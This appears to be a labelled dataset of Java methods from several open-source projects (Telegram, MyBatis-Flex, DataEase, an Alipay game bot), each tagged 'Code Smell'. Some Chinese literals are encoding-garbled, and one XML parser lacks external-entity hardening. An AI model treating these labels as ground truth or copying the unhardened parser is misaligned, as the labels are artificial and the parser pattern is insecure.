text,label,text_label
"@SuppressWarnings(""rawtypes"") public static <T>T startAudit(AuditRunnable<T> supplier,Statement statement,BoundSql boundSql,Configuration configuration) throws SQLException {
  AuditMessage auditMessage=messageFactory.create();
  if (auditMessage == null) {
    return supplier.execute();
  }
  String key=DataSourceKey.get();
  if (StringUtil.isBlank(key)) {
    key=FlexGlobalConfig.getDefaultConfig().getDataSource().getDefaultDataSourceKey();
  }
  auditMessage.setDsName(key);
  auditMessage.setQueryTime(clock.getTick());
  try {
    T result=supplier.execute();
    if (result instanceof Collection) {
      auditMessage.setQueryCount(((Collection)result).size());
    }
 else     if (result instanceof Number) {
      auditMessage.setQueryCount(((Number)result).intValue());
    }
 else     if (result != null) {
      auditMessage.setQueryCount(1);
    }
    return result;
  }
  finally {
    auditMessage.setElapsedTime(clock.getTick() - auditMessage.getQueryTime());
    auditMessage.setQuery(boundSql.getSql());
    Object parameter=boundSql.getParameterObject();
    if (parameter instanceof Map) {
      TypeHandlerRegistry typeHandlerRegistry=configuration.getTypeHandlerRegistry();
      if (((Map<?,?>)parameter).containsKey(FlexConsts.SQL_ARGS)) {
        auditMessage.addParams(statement,((Map<?,?>)parameter).get(FlexConsts.SQL_ARGS));
      }
 else       if (((Map<?,?>)parameter).containsKey(""collection"")) {
        Collection collection=(Collection)((Map<?,?>)parameter).get(""collection"");
        auditMessage.addParams(statement,collection.toArray());
      }
 else       if (((Map<?,?>)parameter).containsKey(""array"")) {
        auditMessage.addParams(statement,((Map<?,?>)parameter).get(""array""));
      }
 else {
        List<ParameterMapping> parameterMappings=boundSql.getParameterMappings();
        for (        ParameterMapping parameterMapping : parameterMappings) {
          if (parameterMapping.getMode() != ParameterMode.OUT) {
            Object value;
            String propertyName=parameterMapping.getProperty();
            if (boundSql.hasAdditionalParameter(propertyName)) {
              value=boundSql.getAdditionalParameter(propertyName);
            }
 else             if (typeHandlerRegistry.hasTypeHandler(parameter.getClass())) {
              value=parameter;
            }
 else {
              MetaObject metaObject=configuration.newMetaObject(parameter);
              value=metaObject.getValue(propertyName);
            }
            auditMessage.addParams(statement,value);
          }
        }
      }
    }
    messageCollector.collect(auditMessage);
  }
}",1,Code Smell
"public static int dp(int[] arr){
  if (arr == null || arr.length < 2) {
    return 0;
  }
  int sum=0;
  for (  int num : arr) {
    sum+=num;
  }
  sum/=2;
  int N=arr.length;
  int M=(N + 1) / 2;
  int[][][] dp=new int[N + 1][M + 1][sum + 1];
  for (int i=0; i <= N; i++) {
    for (int j=0; j <= M; j++) {
      for (int k=0; k <= sum; k++) {
        dp[i][j][k]=-1;
      }
    }
  }
  for (int rest=0; rest <= sum; rest++) {
    dp[N][0][rest]=0;
  }
  for (int i=N - 1; i >= 0; i--) {
    for (int picks=0; picks <= M; picks++) {
      for (int rest=0; rest <= sum; rest++) {
        int p1=dp[i + 1][picks][rest];
        int p2=-1;
        int next=-1;
        if (picks - 1 >= 0 && arr[i] <= rest) {
          next=dp[i + 1][picks - 1][rest - arr[i]];
        }
        if (next != -1) {
          p2=arr[i] + next;
        }
        dp[i][picks][rest]=Math.max(p1,p2);
      }
    }
  }
  if ((arr.length & 1) == 0) {
    return dp[0][arr.length / 2][sum];
  }
 else {
    return Math.max(dp[0][arr.length / 2][sum],dp[0][(arr.length / 2) + 1][sum]);
  }
}",1,Code Smell
"public boolean hidePopup(boolean byBackButton){
  return hidePopup(byBackButton,false);
}
public boolean hidePopup(boolean byBackButton,boolean forceAnimate){
  if (isPopupShowing()) {
    if (currentPopupContentType == POPUP_CONTENT_BOT_KEYBOARD && botReplyMarkup != null && byBackButton && botButtonsMessageObject != null) {
      if (botReplyMarkup.is_persistent) {
        return false;
      }
      MessagesController.getMainSettings(currentAccount).edit().putInt(""closed_botkeyboard_"" + getTopicKeyString(),botButtonsMessageObject.getId()).apply();
    }
    if (byBackButton && searchingType != 0 || forceAnimate) {
      setSearchingTypeInternal(0,true);
      if (emojiView != null) {
        emojiView.closeSearch(true);
      }
      if (messageEditText != null) {
        messageEditText.requestFocus();
      }
      setStickersExpanded(false,true,false);
      if (emojiTabOpen) {
        checkSendButton(true);
      }
    }
 else {
      if (searchingType != 0) {
        setSearchingTypeInternal(0,false);
        emojiView.closeSearch(false);
        if (messageEditText != null) {
          messageEditText.requestFocus();
        }
      }
      showPopup(0,0);
    }
    return true;
  }
  return false;
}",1,Code Smell
"/** 
 * Reads the next packet of the ogg stream. In case of an  {@code IOException} the caller must makesure to pass the same instance of  {@code ParsableByteArray} to this method again so this readercan resume properly from an error while reading a continued packet spanned across multiple pages.
 * @param input The {@link ExtractorInput} to read data from.
 * @return {@code true} if the read was successful. The read fails if the end of the input isencountered without reading data.
 * @throws IOException If reading from the input fails.
 * @throws InterruptedException If the thread is interrupted.
 */
public boolean populate(ExtractorInput input) throws IOException, InterruptedException {
  Assertions.checkState(input != null);
  if (populated) {
    populated=false;
    packetArray.reset();
  }
  while (!populated) {
    if (currentSegmentIndex < 0) {
      if (!pageHeader.populate(input,true)) {
        return false;
      }
      int segmentIndex=0;
      int bytesToSkip=pageHeader.headerSize;
      if ((pageHeader.type & 0x01) == 0x01 && packetArray.limit() == 0) {
        bytesToSkip+=calculatePacketSize(segmentIndex);
        segmentIndex+=segmentCount;
      }
      input.skipFully(bytesToSkip);
      currentSegmentIndex=segmentIndex;
    }
    int size=calculatePacketSize(currentSegmentIndex);
    int segmentIndex=currentSegmentIndex + segmentCount;
    if (size > 0) {
      if (packetArray.capacity() < packetArray.limit() + size) {
        packetArray.data=Arrays.copyOf(packetArray.data,packetArray.limit() + size);
      }
      input.readFully(packetArray.data,packetArray.limit(),size);
      packetArray.setLimit(packetArray.limit() + size);
      populated=pageHeader.laces[segmentIndex - 1] != 255;
    }
    currentSegmentIndex=segmentIndex == pageHeader.pageSegmentCount ? C.INDEX_UNSET : segmentIndex;
  }
  return true;
}",1,Code Smell
"public SearchTextField(String name,JButton SearchButton){
  super(name);
  try {
    stdout=new PrintWriter(BurpExtender.getCallbacks().getStdout(),true);
    stderr=new PrintWriter(BurpExtender.getCallbacks().getStderr(),true);
  }
 catch (  Exception e) {
    stdout=new PrintWriter(System.out,true);
    stderr=new PrintWriter(System.out,true);
  }
  addActionListener(new ActionListener(){
    public void actionPerformed(    ActionEvent e){
      SearchButton.doClick();
    }
  }
);
  addMouseListener(new MouseAdapter(){
    @Override public void mouseClicked(    MouseEvent e){
      if (SwingUtilities.isLeftMouseButton(e) && e.getClickCount() == 2) {
      }
      if (e.getButton() == MouseEvent.BUTTON3) {
      }
    }
  }
);
  addKeyListener(new KeyAdapter(){
    public void keyPressed(    KeyEvent e){
      if (e.getKeyCode() == KeyEvent.VK_KP_UP || e.getKeyCode() == KeyEvent.VK_UP) {
        try {
          History searchHistory=History.getInstance();
          String record=searchHistory.moveUP();
          if (record != null) {
            setText(record);
          }
        }
 catch (        Exception ex) {
          ex.printStackTrace(stderr);
        }
      }
      if (e.getKeyCode() == KeyEvent.VK_KP_DOWN || e.getKeyCode() == KeyEvent.VK_DOWN) {
        try {
          History searchHistory=History.getInstance();
          String record=searchHistory.moveDown();
          if (record != null) {
            setText(record);
          }
        }
 catch (        Exception ex) {
          ex.printStackTrace(stderr);
        }
      }
    }
  }
);
  addMouseWheelListener(new MouseWheelListener(){
    @Override public void mouseWheelMoved(    MouseWheelEvent e){
      if (e.getWheelRotation() == 1) {
        try {
          History searchHistory=History.getInstance();
          String record=searchHistory.moveUP();
          if (record != null) {
            setText(record);
          }
        }
 catch (        Exception ex) {
          ex.printStackTrace(stderr);
        }
      }
      if (e.getWheelRotation() == -1) {
        try {
          History searchHistory=History.getInstance();
          String record=searchHistory.moveDown();
          if (record != null) {
            setText(record);
          }
        }
 catch (        Exception ex) {
          ex.printStackTrace(stderr);
        }
      }
    }
  }
);
  setColumns(30);
}",1,Code Smell
"protected void loadReplyMessages(LongSparseArray<SparseArray<ArrayList<TLRPC.Message>>> replyMessageOwners,LongSparseArray<ArrayList<Integer>> dialogReplyMessagesIds,ArrayList<Long> usersToLoad,ArrayList<Long> chatsToLoad,int mode) throws SQLiteException {
  if (replyMessageOwners.isEmpty()) {
    return;
  }
  final boolean scheduled=mode == ChatActivity.MODE_SCHEDULED;
  final boolean quickReplies=mode == ChatActivity.MODE_QUICK_REPLIES;
  final long selfId=getUserConfig().getClientUserId();
  for (int b=0, N2=replyMessageOwners.size(); b < N2; b++) {
    long dialogId=replyMessageOwners.keyAt(b);
    SparseArray<ArrayList<TLRPC.Message>> owners=replyMessageOwners.valueAt(b);
    ArrayList<Integer> ids=dialogReplyMessagesIds.get(dialogId);
    if (ids == null) {
      continue;
    }
    SQLiteCursor cursor=null;
    try {
      for (int i=0; i < 2; i++) {
        if (i == 1 && !scheduled) {
          continue;
        }
        boolean findInScheduled=i == 1;
        if (quickReplies) {
          cursor=database.queryFinalized(String.format(Locale.US,""SELECT data, mid, date, topic_id FROM quick_replies_messages WHERE mid IN(%s) AND topic_id = %d"",TextUtils.join("","",ids),dialogId));
        }
 else         if (findInScheduled) {
          cursor=database.queryFinalized(String.format(Locale.US,""SELECT data, mid, date, uid FROM scheduled_messages_v2 WHERE mid IN(%s) AND uid = %d"",TextUtils.join("","",ids),dialogId));
        }
 else {
          cursor=database.queryFinalized(String.format(Locale.US,""SELECT data, mid, date, uid FROM messages_v2 WHERE mid IN(%s) AND uid = %d"",TextUtils.join("","",ids),dialogId));
        }
        while (cursor.next()) {
          NativeByteBuffer data=cursor.byteBufferValue(0);
          if (data != null) {
            TLRPC.Message message=TLRPC.Message.TLdeserialize(data,data.readInt32(false),false);
            message.readAttachPath(data,getUserConfig().clientUserId);
            data.reuse();
            message.id=cursor.intValue(1);
            message.date=cursor.intValue(2);
            if (quickReplies) {
              message.dialog_id=selfId;
              message.flags|=1073741824;
              message.quick_reply_shortcut_id=cursor.intValue(3);
            }
 else {
              message.dialog_id=cursor.longValue(3);
            }
            addUsersAndChatsFromMessage(message,usersToLoad,chatsToLoad,null);
            ArrayList<TLRPC.Message> arrayList=owners.get(message.id);
            if (arrayList != null) {
              for (int a=0, N=arrayList.size(); a < N; a++) {
                TLRPC.Message m=arrayList.get(a);
                m.replyMessage=message;
                MessageObject.getDialogId(message);
              }
            }
          }
        }
        cursor.dispose();
      }
    }
 catch (    Exception e) {
      throw e;
    }
 finally {
      if (cursor != null) {
        cursor.dispose();
      }
    }
  }
}",1,Code Smell
"private void toggleCameraInput(){
  VoIPService service=VoIPService.getSharedInstance();
  if (service != null) {
    if (accessibilityManager.isTouchExplorationEnabled()) {
      final String text;
      if (!currentUserIsVideo) {
        text=LocaleController.getString(""AccDescrVoipCamOn"",R.string.AccDescrVoipCamOn);
      }
 else {
        text=LocaleController.getString(""AccDescrVoipCamOff"",R.string.AccDescrVoipCamOff);
      }
      fragmentView.announceForAccessibility(text);
    }
    if (!currentUserIsVideo) {
      if (Build.VERSION.SDK_INT >= 21) {
        if (previewDialog == null) {
          service.createCaptureDevice(false);
          if (!service.isFrontFaceCamera()) {
            service.switchCamera();
          }
          windowView.setLockOnScreen(true);
          int[] locVideoButton=new int[2];
          bottomVideoBtn.getLocationOnScreen(locVideoButton);
          previewDialog=new PrivateVideoPreviewDialogNew(fragmentView.getContext(),locVideoButton[0],locVideoButton[1]){
            @Override public void onDismiss(            boolean screencast,            boolean apply){
              previewDialog=null;
              VoIPService service=VoIPService.getSharedInstance();
              windowView.setLockOnScreen(false);
              if (apply) {
                currentUserIsVideo=true;
                if (service != null && !screencast) {
                  service.requestVideoCall(false);
                  service.setVideoState(false,Instance.VIDEO_STATE_ACTIVE);
                  service.switchToSpeaker();
                }
                if (service != null) {
                  setVideoAction(bottomVideoBtn,service,true);
                }
              }
 else {
                if (service != null) {
                  service.setVideoState(false,Instance.VIDEO_STATE_INACTIVE);
                }
              }
              previousState=currentState;
              updateViewState();
            }
            @Override protected void afterOpened(){
              gradientLayout.lockDrawing=true;
              gradientLayout.invalidate();
            }
            @Override protected void beforeClosed(){
              gradientLayout.lockDrawing=false;
              gradientLayout.invalidate();
            }
            @Override protected int[] getFloatingViewLocation(){
              int[] loc=new int[2];
              int[] result=new int[3];
              currentUserCameraFloatingLayout.getLocationOnScreen(loc);
              result[0]=loc[0];
              result[1]=loc[1];
              result[2]=currentUserCameraFloatingLayout.getMeasuredWidth();
              return result;
            }
            @Override protected boolean isHasVideoOnMainScreen(){
              return callingUserIsVideo;
            }
          }
;
          if (lastInsets != null) {
            previewDialog.setBottomPadding(lastInsets.getSystemWindowInsetBottom());
          }
          fragmentView.addView(previewDialog);
        }
        return;
      }
 else {
        currentUserIsVideo=true;
        if (!service.isSpeakerphoneOn()) {
          VoIPService.getSharedInstance().toggleSpeakerphoneOrShowRouteSheet(activity,false);
        }
        service.requestVideoCall(false);
        service.setVideoState(false,Instance.VIDEO_STATE_ACTIVE);
      }
    }
 else {
      currentUserTextureView.saveCameraLastBitmap();
      service.setVideoState(false,Instance.VIDEO_STATE_INACTIVE);
      if (Build.VERSION.SDK_INT >= 21) {
        service.clearCamera();
      }
    }
    previousState=currentState;
    updateViewState();
  }
}",1,Code Smell
"@Override protected List<DriverEntity> readDriverEntities(Reader in) throws DriverEntityManagerException {
  List<DriverEntity> driverEntities=new ArrayList<DriverEntity>();
  DocumentBuilderFactory documentBuilderFactory;
  DocumentBuilder documentBuilder;
  Document document;
  try {
    documentBuilderFactory=DocumentBuilderFactory.newInstance();
    documentBuilder=documentBuilderFactory.newDocumentBuilder();
    document=documentBuilder.parse(new InputSource(in));
    NodeList nodeList=document.getElementsByTagName(ELEMENT_NAME_DRIVER_ENTITY);
    for (int i=0; i < nodeList.getLength(); i++) {
      DriverEntity driverEntity=new DriverEntity();
      Node node=nodeList.item(i);
      NodeList children=node.getChildNodes();
      for (int j=0; j < children.getLength(); j++) {
        Node child=children.item(j);
        String nodeName=child.getNodeName();
        String nodeContent=child.getTextContent();
        if (nodeContent != null)         nodeContent=nodeContent.trim();
        if (ELEMENT_NAME_ID.equalsIgnoreCase(nodeName))         driverEntity.setId(nodeContent);
 else         if (ELEMENT_NAME_DRIVER_CLASS_NAME.equalsIgnoreCase(nodeName))         driverEntity.setDriverClassName(nodeContent);
 else         if (ELEMENT_NAME_DISPLAY_NAME.equalsIgnoreCase(nodeName))         driverEntity.setDisplayName(nodeContent);
 else         if (ELEMENT_NAME_DISPLAY_DESC.equalsIgnoreCase(nodeName))         driverEntity.setDisplayDesc(nodeContent);
 else         if (ELEMENT_NAME_JRE_VERSION.equalsIgnoreCase(nodeName))         driverEntity.setJreVersion(nodeContent);
 else         if (ELEMENT_NAME_DATABASE_NAME.equalsIgnoreCase(nodeName))         driverEntity.setDatabaseName(nodeContent);
 else         if (ELEMENT_NAME_DATABASE_VERSIONS.equalsIgnoreCase(nodeName)) {
          NodeList dbVersionChildren=child.getChildNodes();
          int dbVersionLength=dbVersionChildren.getLength();
          if (dbVersionLength > 0) {
            List<String> databaseVersions=new ArrayList<String>(dbVersionLength);
            for (int k=0; k < dbVersionLength; k++) {
              Node dbVersionNode=dbVersionChildren.item(k);
              if (!ELEMENT_NAME_DATABASE_VERSION.equalsIgnoreCase(dbVersionNode.getNodeName()))               continue;
              String dbVersionNodeContent=dbVersionNode.getTextContent();
              if (dbVersionNodeContent != null)               dbVersionNodeContent=dbVersionNodeContent.trim();
              if (!dbVersionNodeContent.isEmpty())               databaseVersions.add(dbVersionNodeContent);
            }
            if (!databaseVersions.isEmpty())             driverEntity.setDatabaseVersions(databaseVersions);
          }
        }
      }
      if (isValidDriverEntity(driverEntity)) {
        removeExists(driverEntities,driverEntity.getId());
        driverEntities.add(driverEntity);
      }
    }
  }
 catch (  Exception e) {
    throw new DriverEntityManagerException(e);
  }
  return driverEntities;
}",1,Code Smell
"private void allocArrays(final int size){
  if (mHashes == EMPTY_IMMUTABLE_INTS) {
    throw new UnsupportedOperationException(""ArrayMap is immutable"");
  }
  if (size == (BASE_SIZE * 2)) {
synchronized (ArrayMap.class) {
      if (mTwiceBaseCache != null) {
        final Object[] array=mTwiceBaseCache;
        mArray=array;
        mTwiceBaseCache=(Object[])array[0];
        mHashes=(int[])array[1];
        array[0]=array[1]=null;
        mTwiceBaseCacheSize--;
        if (DEBUG)         Log.d(TAG,""Retrieving 2x cache "" + mHashes + "" now have ""+ mTwiceBaseCacheSize+ "" entries"");
        return;
      }
    }
  }
 else   if (size == BASE_SIZE) {
synchronized (ArrayMap.class) {
      if (mBaseCache != null) {
        final Object[] array=mBaseCache;
        mArray=array;
        mBaseCache=(Object[])array[0];
        mHashes=(int[])array[1];
        array[0]=array[1]=null;
        mBaseCacheSize--;
        if (DEBUG)         Log.d(TAG,""Retrieving 1x cache "" + mHashes + "" now have ""+ mBaseCacheSize+ "" entries"");
        return;
      }
    }
  }
  mHashes=new int[size];
  mArray=new Object[size << 1];
}",1,Code Smell
"private static void energyRain(){
  try {
    JSONObject joEnergyRainHome=new JSONObject(AntForestRpcCall.queryEnergyRainHome());
    if (""SUCCESS"".equals(joEnergyRainHome.getString(""resultCode""))) {
      if (joEnergyRainHome.getBoolean(""canPlayToday"")) {
        startEnergyRain();
      }
      if (joEnergyRainHome.getBoolean(""canGrantStatus"")) {
        Log.recordLog(""鏈夐�佽兘閲忛洦鐨勬満浼�"");
        JSONObject joEnergyRainCanGrantList=new JSONObject(AntForestRpcCall.queryEnergyRainCanGrantList());
        JSONArray grantInfos=joEnergyRainCanGrantList.getJSONArray(""grantInfos"");
        List<String> list=Config.getGiveEnergyRainList();
        String userId;
        boolean granted=false;
        for (int j=0; j < grantInfos.length(); j++) {
          JSONObject grantInfo=grantInfos.getJSONObject(j);
          if (grantInfo.getBoolean(""canGrantedStatus"")) {
            userId=grantInfo.getString(""userId"");
            if (list.contains(userId)) {
              JSONObject joEnergyRainChance=new JSONObject(AntForestRpcCall.grantEnergyRainChance(userId));
              Log.recordLog(""灏濊瘯閫佽兘閲忛洦缁欍��"" + FriendIdMap.getNameById(userId) + ""銆�"");
              granted=true;
              if (""SUCCESS"".equals(joEnergyRainChance.getString(""resultCode""))) {
                Log.forest(""閫佽兘閲忛洦馃導锔廩"" + FriendIdMap.getNameById(userId) + ""]#""+ FriendIdMap.getNameById(FriendIdMap.getCurrentUid()));
                startEnergyRain();
              }
 else {
                Log.recordLog(""閫佽兘閲忛洦澶辫触"",joEnergyRainChance.toString());
              }
              break;
            }
          }
        }
        if (!granted) {
          Log.recordLog(""娌℃湁鍙互閫佺殑鐢ㄦ埛"");
        }
      }
    }
    joEnergyRainHome=new JSONObject(AntForestRpcCall.queryEnergyRainHome());
    if (""SUCCESS"".equals(joEnergyRainHome.getString(""resultCode"")) && joEnergyRainHome.getBoolean(""canPlayToday"")) {
      startEnergyRain();
    }
  }
 catch (  Throwable th) {
    Log.i(TAG,""energyRain err:"");
    Log.printStackTrace(TAG,th);
  }
}",1,Code Smell
"/** 
 * 杩斿洖json鏍煎紡鐨勯敭鍊煎
 * @param key   :閿�
 * @param value :鍊�
 * @param json  :杩斿洖鍊� ""key"":value or value
 */
private void writeObjItem(String key,Object value,StringBuilder json){
  if (key != null) {
    json.append(STR_SLASH).append(key).append(STR_SLASH_STR);
  }
  if (value == null) {
    json.append(""null"");
  }
 else   if (value instanceof String || value instanceof Byte || value instanceof CharSequence) {
    json.append(STR_SLASH).append(value.toString()).append(STR_SLASH);
  }
 else   if (value instanceof Boolean || value instanceof Short || value instanceof Integer|| value instanceof Long|| value instanceof Float|| value instanceof Double) {
    json.append(value);
  }
 else   if (value instanceof Object[] || value instanceof Collection) {
    Collection valueColl=null;
    if (value instanceof Object[]) {
      Object[] valueArr=(Object[])value;
      valueColl=Arrays.asList(valueArr);
    }
 else     if (value instanceof Collection) {
      valueColl=(Collection)value;
    }
    json.append(STR_ARRAY_LEFT);
    if (valueColl.size() > 0) {
      for (      Object obj : valueColl) {
        writeObjItem(null,obj,json);
        json.append(STR_COMMA);
      }
      json.delete(json.length() - 1,json.length());
    }
    json.append(STR_ARRAY_RIGHT);
  }
 else   if (value instanceof Map) {
    Map<?,?> valueMap=(Map<?,?>)value;
    json.append(STR_OBJECT_LEFT);
    if (!valueMap.isEmpty()) {
      Set<?> keys=valueMap.keySet();
      for (      Object valueMapItemKey : keys) {
        writeObjItem(valueMapItemKey.toString(),valueMap.get(valueMapItemKey),json);
        json.append(STR_COMMA);
      }
      json.delete(json.length() - 1,json.length());
    }
    json.append(STR_OBJECT_RIGHT);
  }
 else {
    json.append(STR_OBJECT_LEFT);
    Field[] fields=getDeclaredFields(value.getClass());
    if (fields.length > 0) {
      for (      Field field : fields) {
        Object fieldObj=getFieldObject(field,value);
        writeObjItem(field.getName(),fieldObj,json);
        json.append(STR_COMMA);
      }
      json.delete(json.length() - 1,json.length());
    }
    json.append(STR_OBJECT_RIGHT);
  }
}",1,Code Smell
"private static SQLObj buildSortField(DeSortField f,SQLObj tableObj,int i,List<DatasetTableFieldDTO> originFields,boolean isCross,Map<Long,DatasourceSchemaDTO> dsMap){
  String originField;
  if (ObjectUtils.isNotEmpty(f.getExtField()) && Objects.equals(f.getExtField(),ExtFieldConstant.EXT_CALC)) {
    originField=Utils.calcFieldRegex(f.getOriginName(),tableObj,originFields,isCross,dsMap);
  }
 else   if (ObjectUtils.isNotEmpty(f.getExtField()) && Objects.equals(f.getExtField(),ExtFieldConstant.EXT_COPY)) {
    originField=String.format(SQLConstants.FIELD_NAME,tableObj.getTableAlias(),f.getDataeaseName());
  }
 else {
    originField=String.format(SQLConstants.FIELD_NAME,tableObj.getTableAlias(),f.getDataeaseName());
  }
  String fieldAlias=String.format(SQLConstants.FIELD_ALIAS_X_PREFIX,i);
  String fieldName="""";
  if (Objects.equals(f.getDeExtractType(),DeTypeConstants.DE_TIME)) {
    if (Objects.equals(f.getDeType(),DeTypeConstants.DE_INT) || Objects.equals(f.getDeType(),DeTypeConstants.DE_FLOAT)) {
      fieldName=String.format(SQLConstants.UNIX_TIMESTAMP,originField);
    }
 else {
      fieldName=originField;
    }
  }
 else   if (Objects.equals(f.getDeExtractType(),DeTypeConstants.DE_STRING)) {
    if (Objects.equals(f.getDeType(),DeTypeConstants.DE_INT)) {
      fieldName=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_INT_FORMAT);
    }
 else     if (Objects.equals(f.getDeType(),DeTypeConstants.DE_FLOAT)) {
      fieldName=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_FLOAT_FORMAT);
    }
 else     if (Objects.equals(f.getDeType(),DeTypeConstants.DE_TIME)) {
      fieldName=StringUtils.isEmpty(f.getDateFormat()) ? String.format(SQLConstants.DE_STR_TO_DATE,originField,SQLConstants.DEFAULT_DATE_FORMAT) : String.format(SQLConstants.DE_DATE_FORMAT,String.format(SQLConstants.DE_STR_TO_DATE,originField,f.getDateFormat()),SQLConstants.DEFAULT_DATE_FORMAT);
    }
 else {
      fieldName=originField;
    }
  }
 else {
    if (Objects.equals(f.getDeType(),DeTypeConstants.DE_TIME)) {
      String cast=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_INT_FORMAT);
      fieldName=String.format(SQLConstants.FROM_UNIXTIME,cast,SQLConstants.DEFAULT_DATE_FORMAT);
    }
 else     if (Objects.equals(f.getDeType(),DeTypeConstants.DE_INT)) {
      fieldName=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_INT_FORMAT);
    }
 else     if (Objects.equals(f.getDeType(),DeTypeConstants.DE_FLOAT)) {
      fieldName=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_FLOAT_FORMAT);
    }
 else {
      fieldName=originField;
    }
  }
  SQLObj result=SQLObj.builder().orderField(String.format(SQLConstants.FIELD_DOT,originField)).orderAlias(String.format(SQLConstants.FIELD_DOT,originField)).orderDirection(f.getOrderDirection()).build();
  return result;
}
",1,Code Smell
"public void clearBotKeyboard(MessagesStorage.TopicKey topicKey,ArrayList<Integer> messages){
  AndroidUtilities.runOnUIThread(() -> {
    if (messages != null) {
      for (int a=0; a < messages.size(); a++) {
        final int id=messages.get(a);
        MessagesStorage.TopicKey foundTopicKey=botKeyboardsByMids.get(id);
        if (foundTopicKey != null) {
          botKeyboards.remove(foundTopicKey);
          ArrayList<TLRPC.Message> dialogMessages=botDialogKeyboards.get(foundTopicKey.dialogId);
          if (dialogMessages != null) {
            for (int i=0; i < dialogMessages.size(); ++i) {
              TLRPC.Message msg=dialogMessages.get(i);
              if (msg == null || msg.id == id) {
                dialogMessages.remove(i);
                i--;
              }
            }
            if (dialogMessages.isEmpty()) {
              botDialogKeyboards.remove(foundTopicKey.dialogId);
            }
          }
          botKeyboardsByMids.remove(id);
          getNotificationCenter().postNotificationName(NotificationCenter.botKeyboardDidLoad,null,foundTopicKey);
        }
      }
    }
 else     if (topicKey != null) {
      botKeyboards.remove(topicKey);
      botDialogKeyboards.remove(topicKey.dialogId);
      getNotificationCenter().postNotificationName(NotificationCenter.botKeyboardDidLoad,null,topicKey);
    }
  }
);
}
public void clearBotKeyboard(long dialogId){
  AndroidUtilities.runOnUIThread(() -> {
    ArrayList<TLRPC.Message> dialogMessages=botDialogKeyboards.get(dialogId);
    if (dialogMessages != null) {
      for (int i=0; i < dialogMessages.size(); ++i) {
        TLRPC.Message msg=dialogMessages.get(i);
        int topicId=MessageObject.getTopicId(msg,ChatObject.isForum(currentAccount,dialogId));
        MessagesStorage.TopicKey topicKey=MessagesStorage.TopicKey.of(dialogId,topicId);
        botKeyboards.remove(topicKey);
        getNotificationCenter().postNotificationName(NotificationCenter.botKeyboardDidLoad,null,topicKey);
      }
    }
    botDialogKeyboards.remove(dialogId);
  }
);
}",1,Code Smell
